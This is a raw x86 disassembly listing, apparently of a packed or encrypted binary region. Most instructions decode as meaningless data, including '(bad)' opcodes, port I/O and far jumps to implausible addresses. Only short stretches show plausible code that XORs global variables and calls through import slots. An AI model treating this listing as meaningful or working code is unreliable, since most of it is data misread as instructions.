  404a5f:	xor    DWORD PTR [esi],0xe168c1ee
  404a65:	adc    al,0xfb
  404a67:	stos   BYTE PTR es:[edi],al
  404a68:	mov    dl,0x63
  404a6a:	adc    eax,0x378c4848
  404a6f:	test   eax,0xef6a506e
  404a74:	out    0xce,eax
  404a76:	out    0xc0,eax
  404a78:	lods   al,BYTE PTR ds:[esi]
  404a79:	fs std 
  404a7b:	sbb    BYTE PTR [ebx-0x7f28ea4d],0xa2
  404a82:	jae    0x404af7
  404a84:	arpl   WORD PTR [edx+0x77],sp
  404a87:	fcom   DWORD PTR [esi-0x7e43229a]
  404a8d:	int3   
  404a8e:	inc    eax
  404a8f:	fisub  DWORD PTR [edi+ecx*1-0x54]
  404a93:	rol    DWORD PTR [edx],0x1
  404a96:	cmp    eax,0x4229a2
  404a9b:	shr    eax,0x2
  404a9e:	mov    eax,DWORD PTR [ebx]
  404aa0:	mov    edx,DWORD PTR ds:0x4229a2
  404aa6:	xor    DWORD PTR ds:0x4228b2,edx
  404aac:	mov    edx,DWORD PTR [ebx+0x4]
  404aaf:	and    DWORD PTR ds:0x42293e,0x42295a
  404ab9:	xor    ecx,edi
  404abb:	shl    eax,0x1e
  404abe:	adc    DWORD PTR ds:0x4229a6,0x6b1a
  404ac8:	xor    eax,eax
  404aca:	or     DWORD PTR ds:0x422942,edi
  404ad0:	jmp    0x40505a
  404ad5:	xchg   DWORD PTR [edx+esi*8-0x3a],ebx
  404ad9:	fcomp  DWORD PTR [eax]
  404adb:	xor    bl,BYTE PTR [ecx+ebx*8]
  404ade:	ins    BYTE PTR es:[edi],dx
  404adf:	jp     0x404a8f
  404ae1:	rcr    ebp,0x8c
  404ae4:	outs   dx,BYTE PTR ds:[esi]
  404ae5:	lods   al,BYTE PTR ds:[esi]
  404ae6:	mov    bh,0x16
  404ae8:	push   ss
  404ae9:	cmp    eax,0xab161604
  404aee:	sbb    cl,BYTE PTR [edx+0x36]
  404af1:	cs fwait
  404af3:	add    al,0x6a
  404af5:	(bad)  
  404af6:	rcl    bl,0xdd
  404af9:	fist   WORD PTR [ebp-0x21]
  404afc:	aam    0x40
  404afe:	loopne 0x404a9e
  404b00:	out    0x15,al
  404b02:	push   ebp
  404b03:	test   DWORD PTR [edx-0x35d2f921],0x19596790
  404b0d:	jo     0x404ae1
  404b0f:	cmc    
  404b10:	out    0xe7,al
  404b12:	into   
  404b13:	js     0x404a96
  404b15:	and    bl,BYTE PTR [eax]
  404b17:	leave  
  404b18:	push   edi
  404b19:	out    0x1f,al
  404b1b:	pushf  
  404b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b1d:	sub    BYTE PTR ds:0x316ce109,bh
  404b23:	cmp    eax,0xd3b58f1
  404b28:	rol    DWORD PTR [esi+0xd],1
  404b2b:	adc    BYTE PTR cs:[edx*1+0x7ba73d5f],0xbc
  404b34:	xor    edx,DWORD PTR [eax]
  404b36:	xor    eax,0x3f150b31
  404b3b:	dec    edx
  404b3c:	ret    
  404b3d:	cmp    dh,BYTE PTR [esp+ebp*8+0x7dff6a8b]
  404b44:	mov    DWORD PTR [edx+0x19d75a9],eax
  404b4a:	sbb    ebx,DWORD PTR [ebp+ebx*4+0x44]
  404b4e:	pop    ebp
  404b4f:	fadd   DWORD PTR [edx-0x74deb434]
  404b55:	idiv   DWORD PTR [edx]
  404b57:	mov    BYTE PTR [esi-0x4851686],bh
  404b5d:	inc    eax
  404b5e:	cmp    edx,ecx
  404b60:	shl    bl,1
  404b62:	std    
  404b63:	sub    al,0x84
  404b65:	pop    ds
  404b66:	or     eax,0xc67b58bc
  404b6b:	pop    ss
  404b6c:	adc    BYTE PTR [edi+eiz*4-0x58227659],bl
  404b73:	cmp    DWORD PTR [edi],esi
  404b75:	out    dx,al
  404b76:	popf   
  404b77:	xchg   esp,eax
  404b78:	ins    BYTE PTR es:[edi],dx
  404b79:	std    
  404b7a:	fstp   DWORD PTR [edi+eax*4]
  404b7d:	jmp    0x6d514ef0
  404b82:	pop    ebp
  404b83:	call   0x6443286c
  404b88:	dec    ebx
  404b89:	mov    eax,ds:0xcec0d7c6
  404b8e:	fistp  WORD PTR [ebx-0x75]
  404b91:	lahf   
  404b92:	xor    dl,BYTE PTR [esp+eax*2+0x12]
  404b96:	loop   0x404b29
  404b98:	bound  ebp,QWORD PTR [edi]
  404b9a:	test   BYTE PTR [edi-0x1898638d],0xac
  404ba1:	sbb    BYTE PTR [edi-0x15],ch
  404ba4:	data16 ins BYTE PTR es:[edi],dx
  404ba6:	mov    es,ebx
  404ba8:	xchg   ebx,eax
  404ba9:	call   0xf5bd:0x12a6ff31
  404bb0:	out    0x81,eax
  404bb2:	pop    es
  404bb3:	lods   al,BYTE PTR ds:[esi]
  404bb4:	call   0xb511:0xa4fa07d3
  404bbb:	dec    eax
  404bbc:	pop    edx
  404bbd:	pop    ss
  404bbe:	jle    0x404be5
  404bc0:	pop    ss
  404bc1:	xlat   BYTE PTR ds:[ebx]
  404bc2:	int3   
  404bc3:	add    eax,0x74b38483
  404bc8:	cmp    al,0xc0
  404bca:	bound  ebx,QWORD PTR [eax+esi*1-0x3a0f1a2a]
  404bd1:	inc    ebx
  404bd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bd3:	cld    
  404bd4:	loop   0x404baa
  404bd6:	(bad)  
  404bd7:	out    0x57,eax
  404bd9:	jae    0x404bc4
  404bdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bdc:	pop    edx
  404bdd:	call   0x7db3f26d
  404be2:	cs xchg ecx,eax
  404be4:	inc    ebx
  404be5:	shl    DWORD PTR [si],1
  404be8:	shl    cl,0xd5
  404beb:	and    eax,0x9db277aa
  404bf0:	ror    BYTE PTR [eax],0xd8
  404bf3:	test   BYTE PTR [esi-0x10240e0d],ah
  404bf9:	stos   BYTE PTR es:[edi],al
  404bfa:	in     eax,dx
  404bfb:	mov    BYTE PTR [edi+0x2eb72d73],bl
  404c01:	out    0xdd,al
  404c03:	mov    edx,esi
  404c05:	(bad)  
  404c06:	cmp    eax,esi
  404c08:	int    0xdb
  404c0a:	out    0xa6,eax
  404c0c:	jo     0x404c73
  404c0e:	in     eax,dx
  404c0f:	add    al,0x9
  404c11:	in     al,dx
  404c12:	push   edi
  404c13:	jmp    DWORD PTR [edi-0x69]
  404c16:	mov    eax,ds:0xd809bb3e
  404c1b:	xchg   edx,eax
  404c1c:	lahf   
  404c1d:	gs push 0xffffffd9
  404c20:	jge    0x404ca1
  404c22:	xor    al,0xc5
  404c24:	mov    ss,WORD PTR [esi+0x13]
  404c27:	or     bh,BYTE PTR [esi+0x53e070a4]
  404c2d:	cs jno 0x404c92
  404c30:	je     0x404c33
  404c32:	inc    edi
  404c33:	mov    ecx,0x11462e80
  404c38:	or     eax,DWORD PTR ds:0x656d88fa
  404c3e:	fisttp QWORD PTR [ecx+0x62844916]
  404c44:	mov    DWORD PTR [ebx+0x10],ebp
  404c47:	imul   edx,DWORD PTR [edx+0x27],0xffffffa3
  404c4b:	cmp    BYTE PTR [eax+eax*4+0x27be2131],bl
  404c52:	xor    al,BYTE PTR [esi-0x77]
  404c55:	mov    cl,0x54
  404c57:	lods   al,BYTE PTR ds:[esi]
  404c58:	in     eax,0xdd
  404c5a:	add    eax,0xcaf160c1
  404c5f:	xchg   esp,eax
  404c60:	psubusw mm0,QWORD PTR [ebp+0x39]
  404c64:	or     BYTE PTR ds:0x14a7d6a5,bh
  404c6a:	outs   dx,BYTE PTR ds:[esi]
  404c6b:	jg     0x404caf
  404c6d:	(bad)  
  404c6e:	mov    ch,0xa6
  404c70:	push   es
  404c71:	outs   dx,BYTE PTR ds:[esi]
  404c72:	cmp    BYTE PTR [esi],0x15
  404c75:	leave  
  404c76:	enter  0xed2a,0x34
  404c7a:	push   ebp
  404c7b:	mov    edx,0xef26e465
  404c80:	push   0xfffffff7
  404c82:	push   esi
  404c83:	push   0xb848be34
  404c88:	and    DWORD PTR [edx+edx*8-0x38b2dbfb],esp
  404c8f:	(bad)  
  404c90:	(bad)  
  404c91:	adc    al,0xbb
  404c93:	mov    cl,0xa6
  404c95:	aam    0x5
  404c97:	shr    DWORD PTR [esi],1
  404c99:	fcomp  st(1)
  404c9b:	shl    BYTE PTR gs:[edi-0x58],cl
  404c9f:	mov    cl,0x24
  404ca1:	iret   
  404ca2:	aad    0xaf
  404ca4:	cdq    
  404ca5:	xchg   esp,eax
  404ca6:	push   eax
  404ca7:	inc    edx
  404ca8:	ss dec esp
  404caa:	and    eax,0xe65cbfc5
  404caf:	les    eax,FWORD PTR [edi-0x65837aa4]
  404cb5:	mov    eax,0xf3b924f5
  404cba:	lods   eax,DWORD PTR ds:[esi]
  404cbb:	lds    ebp,FWORD PTR [eax+0x4757c43]
  404cc1:	ror    DWORD PTR [ecx+0x37],1
  404cc4:	dec    ebp
  404cc5:	iret   
  404cc6:	or     edx,ecx
  404cc8:	lea    ebx,[esi-0x62]
  404ccb:	and    ebp,ecx
  404ccd:	mov    ah,0x19
  404ccf:	cmc    
  404cd0:	out    dx,eax
  404cd1:	and    BYTE PTR [esi+edi*2-0x4f],al
  404cd5:	popf   
  404cd6:	ds ret 0xae5c
  404cda:	es arpl bp,dx
  404cdd:	push   ds
  404cde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cdf:	fist   DWORD PTR [esi]
  404ce1:	and    BYTE PTR [edi+0x5a4f7deb],0x40
  404ce8:	jmp    0xbef3e9d
  404ced:	xchg   ebp,eax
  404cee:	stos   BYTE PTR es:[edi],al
  404cef:	retf   
  404cf0:	inc    edx
  404cf1:	retf   
  404cf2:	scas   al,BYTE PTR es:[edi]
  404cf3:	(bad)  
  404cf4:	xchg   edi,eax
  404cf5:	mov    eax,ds:0x16313bec
  404cfa:	(bad)  
  404cfd:	inc    eax
  404cfe:	xlat   BYTE PTR ds:[ebx]
  404cff:	mov    dh,BYTE PTR ds:0xa15c473e
  404d05:	jmp    0x30ab:0x2eefcf18
  404d0c:	mov    ah,0x9c
  404d0e:	gs xchg ebx,eax
  404d10:	pop    esi
  404d11:	call   0x65f6ecd0
  404d16:	or     bl,BYTE PTR [eax]
  404d18:	mov    al,0xc5
  404d1a:	xchg   ebx,eax
  404d1b:	xchg   ebp,eax
  404d1c:	mov    ch,0xa8
  404d1e:	inc    eax
  404d1f:	push   esi
  404d20:	dec    esi
  404d21:	scas   al,BYTE PTR es:[edi]
  404d22:	loopne 0x404cc7
  404d24:	cmp    BYTE PTR [edx+0x68],0xca
  404d28:	(bad)  
  404d29:	(bad)  
  404d2a:	mov    edx,0xbc0df364
  404d2f:	and    ecx,eax
  404d31:	ss inc esi
  404d33:	push   ss
  404d34:	aaa    
  404d35:	test   BYTE PTR [ecx+0x16b8f382],dh
  404d3b:	inc    esp
  404d3c:	sbb    ebx,DWORD PTR [eax+0x12]
  404d3f:	jge    0x404cd1
  404d41:	mov    ds,WORD PTR [ecx-0x22]
  404d44:	test   eax,0xd43a087d
  404d49:	sbb    ch,dh
  404d4b:	fimul  WORD PTR [edi+0x17]
  404d4e:	adc    esp,DWORD PTR [esp+ebp*1]
  404d51:	xchg   edx,eax
  404d52:	dec    edx
  404d53:	sbb    bl,ah
  404d55:	push   ss
  404d56:	enter  0x15e4,0xe9
  404d5a:	push   ebp
  404d5b:	(bad)  
  404d5d:	out    0x1,eax
  404d5f:	xor    dh,dl
  404d61:	add    BYTE PTR [edx-0x31],dh
  404d64:	push   ds
  404d65:	push   esp
  404d66:	shl    DWORD PTR [ecx-0x50f1ef9e],1
  404d6c:	or     edx,esp
  404d6e:	fldln2 
  404d70:	loope  0x404de7
  404d72:	sub    eax,0x556bca0
  404d77:	mov    eax,ds:0x97cd9baa
  404d7c:	mov    dh,0xdb
  404d7e:	pop    edx
  404d7f:	adc    dl,dh
  404d81:	push   esp
  404d82:	push   eax
  404d83:	loop   0x404d6b
  404d85:	scas   al,BYTE PTR es:[edi]
  404d86:	push   cs
  404d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d88:	xchg   esp,eax
  404d89:	mov    eax,0xcfb85813
  404d8e:	ins    BYTE PTR es:[edi],dx
  404d8f:	push   esi
  404d90:	out    0x66,al
  404d92:	aam    0x67
  404d94:	inc    eax
  404d95:	ja     0x404e07
  404d97:	nop
  404d98:	add    BYTE PTR [esi-0x61579cd],0x1a
  404d9f:	mov    esi,0x4c0c21
  404da4:	jmp    0x1f01:0x223c4c4c
  404dab:	and    BYTE PTR [eax+0x51],dh
  404dae:	in     al,0x77
  404db0:	nop
  404db1:	ret    0x29a1
  404db4:	inc    edx
  404db5:	xchg   ebx,eax
  404db6:	inc    ecx
  404db7:	je     0x404d57
  404db9:	out    dx,al
  404dba:	mov    bl,0x9e
  404dbc:	(bad)  
  404dbd:	mov    ch,0xcc
  404dbf:	mov    al,0xaa
  404dc1:	adc    al,0xe5
  404dc3:	lods   eax,DWORD PTR ds:[esi]
  404dc4:	jle    0x404e40
  404dc6:	or     al,0xc6
  404dc8:	enter  0xb5b9,0x4b
  404dcc:	enter  0xb3a,0x4
  404dd0:	cmp    DWORD PTR [ebp-0x17],edi
  404dd3:	inc    ecx
  404dd4:	lock (bad) 
  404dd6:	into   
  404dd7:	icebp  
  404dd8:	bswap  eax
  404dda:	jge    0x404dad
  404ddc:	jecxz  0x404e3f
  404dde:	or     BYTE PTR [ecx-0x1c25de48],0x3a
  404de5:	shr    DWORD PTR [ecx+0x5b35f73b],0xe5
  404dec:	mov    bh,ah
  404dee:	dec    edi
  404def:	add    ah,BYTE PTR [ebp-0x2d]
  404df2:	loopne 0x404e54
  404df4:	xchg   DWORD PTR [edx],esp
  404df6:	cld    
  404df7:	xchg   esp,eax
  404df8:	mov    ds:0x70f1633f,al
  404dfd:	jbe    0x404da4
  404dff:	xor    ch,BYTE PTR [ebp+ecx*2+0x305ed13]
  404e06:	sub    eax,0x266beaf7
  404e0b:	hlt    
  404e0c:	jp     0x404de2
  404e0e:	jp     0x404dc2
  404e10:	cmp    DWORD PTR [ebx+eiz*1-0x6e],edx
  404e14:	call   0x2c84fc4d
  404e19:	mov    al,ds:0x9310e392
  404e1e:	push   edx
  404e1f:	dec    esp
  404e20:	into   
  404e21:	out    0xa7,al
  404e23:	sub    eax,0xfba7d355
  404e28:	arpl   WORD PTR [edi-0x5b],ax
  404e2b:	shl    DWORD PTR [edi],cl
  404e2d:	jns    0x404e86
  404e2f:	(bad)  
  404e30:	icebp  
  404e31:	mov    ds:0x2e3f1882,al
  404e36:	mov    esp,0x6eba2c85
  404e3b:	mov    bh,0x1c
  404e3d:	loope  0x404e35
  404e3f:	jne    0x404e64
  404e41:	mov    eax,0x57f2e434
  404e46:	sub    ch,BYTE PTR [ebx-0x6d]
  404e49:	aaa    
  404e4a:	ret    
  404e4b:	adc    bh,dh
  404e4d:	js     0x404e1a
  404e4f:	inc    esi
  404e50:	xor    ecx,ebx
  404e52:	pop    ds
  404e53:	jb     0x404e9d
  404e55:	cmc    
  404e56:	in     eax,dx
  404e57:	xor    ebx,DWORD PTR [esp+ebx*4]
  404e5a:	add    BYTE PTR [ecx+0x32],ah
  404e5d:	xchg   ebp,eax
  404e5e:	sub    BYTE PTR [edi+0x1a7c7955],cl
  404e64:	int3   
  404e65:	fsubr  DWORD PTR [edx+edi*1-0xd]
  404e69:	les    ebp,FWORD PTR [esi-0x7257de03]
  404e6f:	push   ebx
  404e70:	int    0x24
  404e72:	push   esp
  404e73:	lahf   
  404e74:	imul   edx,esi,0x74ffb3ae
  404e7a:	push   edi
  404e7b:	and    BYTE PTR [ecx+ebx*8],0x2f
  404e7f:	test   BYTE PTR ds:0xd087e27e,ah
  404e85:	scas   eax,DWORD PTR es:[edi]
  404e86:	xchg   edx,eax
  404e87:	dec    ebp
  404e88:	add    eax,0xcc8731e1
  404e8d:	cli    
  404e8e:	fsubr  st,st(6)
  404e90:	dec    eax
  404e91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e92:	pop    es
  404e93:	shl    BYTE PTR [edx+0x19c4862b],0x97
  404e9a:	iret   
  404e9b:	or     al,0xcb
  404e9d:	and    ecx,DWORD PTR [edi]
  404e9f:	mov    esi,eax
  404ea1:	sbb    al,0x32
  404ea3:	in     al,dx
  404ea4:	pop    esp
  404ea5:	xchg   esi,eax
  404ea6:	aad    0x7a
  404ea8:	ss push edx
  404eaa:	ds std 
  404eac:	pop    ebp
  404ead:	pop    ecx
  404eae:	les    ebx,FWORD PTR [ebx-0x55]
  404eb1:	fisttp QWORD PTR [eax-0x59]
  404eb4:	cmp    edi,DWORD PTR [ebx+0x548c3297]
  404eba:	jne    0x404f1e
  404ebc:	adc    DWORD PTR [ebx+0xb65a96],esp
  404ec2:	jmp    0x404e94
  404ec4:	fist   DWORD PTR [ecx+0x1b]
  404ec7:	ja     0x404e94
  404ec9:	add    edx,ebp
  404ecb:	pop    ebx
  404ecc:	inc    eax
  404ecd:	mov    esp,DWORD PTR [ecx-0x19]
  404ed0:	xlat   BYTE PTR ds:[ebx]
  404ed1:	retf   
  404ed2:	ret    0x6864
  404ed5:	push   ebx
  404ed6:	lock dec esp
  404ed8:	cli    
  404ed9:	jns    0x404eed
  404edb:	push   es
  404edc:	pop    edi
  404edd:	mov    ds:0x504eb983,al
  404ee2:	jl     0x404f4a
  404ee4:	rol    DWORD PTR [eax+0xe],cl
  404ee7:	ins    DWORD PTR es:[edi],dx
  404ee8:	xor    BYTE PTR [esi+0x29a96d36],bl
  404eee:	lock pop es
  404ef0:	cmp    ecx,DWORD PTR [edx-0x51]
  404ef3:	jecxz  0x404ea0
  404ef5:	(bad)  
  404ef6:	mov    ?,WORD PTR [edx-0x740239d2]
  404efc:	out    dx,al
  404efd:	test   DWORD PTR [ebp-0xab47c4],ebx
  404f03:	cmp    edi,edx
  404f05:	push   edx
  404f06:	ds in  eax,dx
  404f08:	jecxz  0x404efa
  404f0a:	gs ins BYTE PTR es:[edi],dx
  404f0c:	sbb    DWORD PTR [esi+0x70],edx
  404f0f:	adc    edi,ebp
  404f11:	cdq    
  404f12:	mov    DWORD PTR [ebx],ebp
  404f14:	inc    esi
  404f15:	fsubr  st,st(2)
  404f17:	iret   
  404f18:	cs pop esi
  404f1a:	enter  0x6060,0x40
  404f1e:	adc    BYTE PTR [ecx],ah
  404f20:	mov    dl,bl
  404f22:	add    BYTE PTR [edx-0x56],al
  404f25:	rcr    DWORD PTR [ebx-0x7e],cl
  404f28:	and    BYTE PTR [eax+0x68],dl
  404f2b:	test   eax,0x6551b8d1
  404f30:	and    eax,0x84955d76
  404f35:	lea    esp,[eax+0x30]
  404f38:	push   es
  404f39:	jbe    0x404f0f
  404f3b:	jg     0x404f31
  404f3d:	pop    eax
  404f3e:	and    al,0xce
  404f40:	int    0x3e
  404f42:	xchg   ebx,eax
  404f43:	xchg   edx,eax
  404f44:	rol    DWORD PTR [edi-0x4806965d],1
  404f4a:	push   esi
  404f4b:	dec    ebx
  404f4c:	les    ecx,FWORD PTR [ebp-0x5268a1eb]
  404f52:	test   al,0x58
  404f54:	dec    esi
  404f55:	xchg   edi,eax
  404f56:	cmp    al,0xcf
  404f58:	sbb    BYTE PTR [edi],bl
  404f5a:	loopne 0x404f48
  404f5c:	or     ah,BYTE PTR [edx]
  404f5e:	push   esi
  404f5f:	push   ds
  404f60:	rcr    BYTE PTR [edx+0x54],1
  404f63:	(bad)  
  404f64:	dec    ebp
  404f65:	mov    ebx,esp
  404f67:	mov    al,0x23
  404f69:	fidivr WORD PTR [edx+0x38]
  404f6c:	rcr    al,0x0
  404f6f:	push   ds
  404f70:	mov    ah,BYTE PTR [edi+0x58]
  404f73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f74:	sbb    BYTE PTR [esi],ch
  404f76:	fmul   DWORD PTR [esi]
  404f78:	pushf  
  404f79:	inc    eax
  404f7a:	pop    ebx
  404f7b:	test   eax,0x4c7098c1
  404f80:	leave  
  404f81:	ins    BYTE PTR es:[edi],dx
  404f82:	sbb    DWORD PTR [eax-0x7a],0xf14ceb5a
  404f89:	adc    eax,0x90b4d857
  404f8e:	mov    ebp,0x8405ee03
  404f93:	pushf  
  404f94:	int    0x2d
  404f96:	sbb    esi,ebp
  404f98:	sbb    bh,BYTE PTR [esi-0x79]
  404f9b:	cmp    eax,0xe9e383e7
  404fa0:	push   ds
  404fa1:	outs   dx,BYTE PTR ds:[esi]
  404fa2:	loope  0x404f76
  404fa4:	loop   0x404f83
  404fa6:	push   es
  404fa7:	xor    DWORD PTR [edi+0xf64a960],eax
  404fad:	loopne 0x404f3d
  404faf:	inc    esi
  404fb0:	mov    cl,0x1
  404fb2:	sbb    esi,eax
  404fb4:	(bad)  
  404fb5:	push   edx
  404fb6:	mov    dl,0x2d
  404fb8:	lods   eax,DWORD PTR ds:[esi]
  404fb9:	adc    esp,DWORD PTR [esi+0x4cc19c33]
  404fbf:	dec    ebp
  404fc0:	mov    esi,0x1501fc90
  404fc5:	jl     0x404f56
  404fc7:	sbb    al,BYTE PTR [edi+0x6b3952c3]
  404fcd:	jg     0x404feb
  404fcf:	or     BYTE PTR [edx-0x4429bab3],0x30
  404fd6:	add    BYTE PTR [eax],dl
  404fd8:	dec    ebp
  404fd9:	nop
  404fda:	and    DWORD PTR [ecx+edx*8],edx
  404fdd:	sub    ebx,DWORD PTR [ecx+0x2d]
  404fe0:	mov    ds:0xe2f0700b,al
  404fe5:	sub    edi,esp
  404fe7:	outs   dx,DWORD PTR ds:[esi]
  404fe8:	das    
  404fe9:	fs jae 0x404f91
  404fec:	mov    esi,0x1fa61fdd
  404ff1:	bnd jno 0x404ff3
  404ff4:	clc    
  404ff5:	sbb    eax,0x293b6cd0
  404ffa:	jnp    0x404ff7
  404ffc:	and    al,BYTE PTR [ebp+0x6c44a82b]
  405002:	cmp    BYTE PTR [ecx-0x53b003b2],0x59
  405009:	mov    ebx,0x99c87704
  40500e:	pop    ebx
  40500f:	push   0x15823686
  405014:	mov    edi,0x400e22b5
  405019:	or     BYTE PTR [edi+0x37302b63],bl
  40501f:	xchg   ecx,eax
  405020:	jecxz  0x40509a
  405022:	adc    DWORD PTR [ebx+0x7f],esi
  405025:	mov    esp,DWORD PTR [ecx-0x7f]
  405028:	jbe    0x404faf
  40502a:	enter  0x508c,0x95
  40502e:	pop    edx
  40502f:	sbb    eax,0xee460746
  405034:	push   ds
  405035:	mov    ebx,0x2a831ecd
  40503a:	in     eax,dx
  40503b:	sub    DWORD PTR [edx+0x7b],0xa99f2143
  405042:	cmp    cl,BYTE PTR [esi+ecx*4]
  405045:	iret   
  405046:	push   edi
  405047:	sahf   
  405048:	sbb    ch,BYTE PTR [eax-0x4f]
  40504b:	push   0x37f2778d
  405050:	ds push 0x44154a60
  405056:	je     0x4050d1
  405058:	xor    esi,DWORD PTR [ebp+0x2d81c10b]
  40505e:	dec    edx
  40505f:	sub    DWORD PTR [edx+0x0],eax
  405062:	mov    WORD PTR [esi],?
  405064:	add    BYTE PTR [eax],al
  405066:	mov    ecx,DWORD PTR [ebx]
  405068:	cmp    DWORD PTR ds:0x42291a,0x0
  40506f:	mov    edx,0x329b
  405074:	mov    DWORD PTR ds:0x42298e,edi
  40507a:	mov    DWORD PTR ds:0x422992,0x6944
  405084:	jmp    0x4050d1
  405089:	mov    DWORD PTR ds:0x4228a2,0x4c5b
  405093:	mov    DWORD PTR ds:0x42294a,0x78c7
  40509d:	jae    0x4050b9
  4050a3:	call   DWORD PTR ds:0x42a048
  4050a9:	and    DWORD PTR ds:0x422976,edi
  4050af:	sub    DWORD PTR ds:0x42292a,0xcc1
  4050b9:	add    edx,DWORD PTR ds:0x4228fe
  4050bf:	mov    edx,DWORD PTR ds:0x4229ae
  4050c5:	xor    DWORD PTR ds:0x42288a,edx
  4050cb:	xor    DWORD PTR ds:0x4228a6,ebx
  4050d1:	mov    edx,DWORD PTR [ebx+0x4]
  4050d4:	shrd   ecx,edx,0x2
  4050d8:	shr    edx,0x2
  4050db:	dec    edx
  4050dc:	mov    DWORD PTR [ebp-0x1c],ecx
  4050df:	mov    ecx,DWORD PTR [ebx]
  4050e1:	cmp    DWORD PTR ds:0x422956,0x0
  4050e8:	mov    DWORD PTR ds:0x4229a6,ecx
  4050ee:	mov    DWORD PTR ds:0x4228be,0x46b1
  4050f8:	mov    edx,0x1a3a
  4050fd:	jmp    0x405154
  405102:	mov    edx,DWORD PTR ds:0x4229be
  405108:	je     0x405144
  40510e:	push   0x4228ce
  405113:	push   0x891e
  405118:	call   DWORD PTR ds:0x42a298
  40511e:	mov    edx,DWORD PTR ds:0x422976
  405124:	sbb    DWORD PTR ds:0x4229a6,edx
  40512a:	or     DWORD PTR ds:0x4229b6,0x4229c6
  405134:	or     edx,DWORD PTR ds:0x4229ba
  40513a:	adc    DWORD PTR ds:0x42295a,0x7410
  405144:	xor    DWORD PTR ds:0x422932,0x293b
  40514e:	or     DWORD PTR ds:0x422982,edx
  405154:	mov    edx,DWORD PTR [ebx+0x4]
  405157:	or     DWORD PTR ds:0x422992,0x45bc
  405161:	xor    DWORD PTR [ebp-0x1c],edi
  405164:	sbb    DWORD PTR ds:0x4229ca,0x422976
  40516e:	xor    edx,edx
  405170:	not    DWORD PTR ds:0x4228d2
  405176:	or     edx,DWORD PTR [ebp-0x1c]
  405179:	or     DWORD PTR ds:0x42291e,0x4228e6
  405183:	jmp    0x40570d
  405188:	mov    cl,0xe1
  40518a:	inc    eax
  40518b:	test   al,0x40
  40518d:	sub    BYTE PTR [ecx],bl
  40518f:	fcomp  st(5)
  405191:	dec    edx
  405192:	int3   
  405193:	outs   dx,BYTE PTR ds:[esi]
  405194:	or     DWORD PTR [edi-0x5c249166],esi
  40519a:	push   ss
  40519b:	push   ss
  40519c:	cmp    eax,0xb161604
  4051a1:	pop    edi
  4051a2:	repnz sub al,0x54
  4051a5:	cmc    
  4051a6:	xor    al,0x2
  4051a8:	adc    ah,bl
  4051aa:	arpl   WORD PTR [edx+eax*8],si
  4051ad:	jecxz  0x40521b
  4051af:	mov    esp,DWORD PTR [edi]
  4051b1:	mov    eax,ds:0x66ac5a27
  4051b6:	jns    0x405167
  4051b8:	push   cs
  4051b9:	fild   QWORD PTR ds:0x1246d2cc
  4051bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051c0:	lods   al,BYTE PTR ds:[esi]
  4051c1:	es mov esp,0x6424d826
  4051c7:	(bad)  
  4051c9:	cmp    al,0x40
  4051cb:	jb     0x405166
  4051cd:	adc    BYTE PTR [esi+0x79ad6010],ch
  4051d3:	inc    esp
  4051d4:	and    al,0xc5
  4051d6:	fsubr  QWORD PTR [eax-0x1]
  4051d9:	jns    0x4051f6
  4051db:	push   ebx
  4051dc:	sub    al,0x9d
  4051de:	add    BYTE PTR [esi-0x66a8cb2],cl
  4051e4:	push   edi
  4051e5:	jo     0x40522d
  4051e7:	and    ch,BYTE PTR [ecx-0xd3161bb]
  4051ed:	sub    al,0xfd
  4051ef:	jl     0x4051ff
  4051f1:	sbb    dh,BYTE PTR [ebx-0x22]
  4051f4:	push   ebp
  4051f5:	inc    ebp
  4051f6:	pop    esi
  4051f7:	fwait
  4051f8:	add    BYTE PTR [eax-0x5e],bl
  4051fb:	add    eax,0xfc208d5
  405200:	in     eax,0x1a
  405202:	imul   ebp,DWORD PTR [esi],0xffffffbc
  405205:	jmp    0xb1add8f9
  40520a:	(bad)  
  40520b:	push   ss
  40520c:	dec    esp
  40520d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40520e:	and    al,0x54
  405210:	jne    0x40527a
  405212:	sub    ch,BYTE PTR [ecx-0x67]
  405215:	test   DWORD PTR [ebx-0x292d2cf8],ecx
  40521b:	dec    esp
  40521c:	pushf  
  40521d:	fistp  DWORD PTR [edi+0x1e3f0552]
  405223:	xor    dl,BYTE PTR cs:[esi-0x58]
  405227:	xchg   BYTE PTR [ecx],dh
  405229:	shl    BYTE PTR [ebp-0x13d65747],cl
  40522f:	pop    esi
  405230:	sbb    ah,BYTE PTR [edx]
  405232:	loop   0x40522c
  405234:	dec    ecx
  405235:	or     BYTE PTR [ecx-0x4a],ch
  405238:	adc    esp,ecx
  40523a:	imul   esp,DWORD PTR [edx+0x5],0xffffffa6
  40523e:	push   edx
  40523f:	jno    0x4052a9
  405241:	inc    edx
  405242:	sbb    eax,0xbbbe7e1a
  405247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405248:	sbb    dl,0x95
  40524b:	mov    al,ds:0xe9b44c83
  405250:	mov    al,ds:0x7016d6a9
  405255:	inc    BYTE PTR [ebx+0x32fea843]
  40525b:	or     esp,DWORD PTR [eax-0x50803702]
  405261:	ss imul esp,esp,0x24
  405265:	ins    BYTE PTR es:[edi],dx
  405266:	ds mov cl,0x9e
  405269:	fisubr DWORD PTR [eax]
  40526b:	dec    ebx
  40526c:	loopne 0x405226
  40526e:	(bad)  
  40526f:	dec    eax
  405270:	cdq    
  405271:	push   ebp
  405272:	dec    esp
  405273:	pop    ebx
  405274:	pop    esp
  405275:	cmp    BYTE PTR [edx+esi*2+0x4b],cl
  405279:	dec    edi
  40527a:	mov    ebx,DWORD PTR [eax]
  40527c:	int3   
  40527d:	stc    
  40527e:	das    
  40527f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405280:	mov    WORD PTR [edx+ecx*4],?
  405283:	jmp    0x4052f2
  405285:	icebp  
  405286:	call   0xe94944d5
  40528b:	and    al,BYTE PTR [ecx]
  40528d:	mov    esi,0x28b09800
  405292:	pop    ds
  405293:	fs sub dl,bh
  405296:	sub    eax,0x40199ae
  40529b:	sub    BYTE PTR [ebx-0x4f189216],al
